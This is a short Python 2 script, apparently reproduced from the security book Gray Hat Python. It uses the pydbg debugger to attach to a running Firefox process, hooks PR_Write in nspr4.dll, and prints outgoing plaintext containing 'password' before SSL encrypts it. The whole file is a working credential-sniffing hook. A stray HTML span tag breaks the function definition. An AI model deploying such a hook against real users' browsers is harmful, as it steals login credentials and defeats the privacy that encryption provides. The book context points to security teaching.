'''
Example taken from Gray Hat Python (book)
This script present a way to hook a DLL library in Firefox. For this example the script hook nspr4.dll which encrypt datas for SSL connection.

So we will be able to get the text before it is encrypted. Moreover we catch a pattern "password" to get all login/password before they are ciphered.
'''

from pydbg import *
from pydbg.defines import *
import utils
import sys

dbg = pydbg()
found_firefox = False

# Set a pattern that we can make the hook to search for
pattern = "password"

# This is our entry hook callback function
def <span style="color: #ff00ff;">ssl_sniff( dbg, args ):
    # Now we read out the memory pointed to by the second argument
    # it is stored as an ASCII string, so we'll loop on a read until
    # we reach a NULL byte
    buffer  = ""
    offset  = 0
    while 1:
        byte = dbg.read_process_memory( args[1] + offset, 1 )
        if byte != "\x00":
            buffer  += byte
            offset  += 1
            continue
        else:
            break
    if pattern in buffer:
        print "Pre-Encrypted: %s" % buffer
    return DBG_CONTINUE

# Quick and dirty process enumeration to find firefox.exe
for (pid, name) in dbg.enumerate_processes():
    if name.lower() == "firefox.exe":
        found_firefox = True
        hooks = utils.hook_container()
        dbg.attach(pid)
        print "[*] Attaching to firefox.exe with PID: %d" % pid

        # Resolve the function address (Just before encryption)
        hook_address  = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")

        if hook_address:
            # Add the hook to the container. We aren't interested
            # in using an exit callback, so we set it to None.
            hooks.add( dbg, hook_address, 2, ssl_sniff, None )
            print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address
            break
        else:
            print "[*] Error: Couldn't resolve hook address."
            sys.exit(-1)

if found_firefox:    
    print "[*] Hooks set, continuing process."
    dbg.run()
else:    
    print "[*] Error: Couldn't find the firefox.exe process."
    sys.exit(-1)
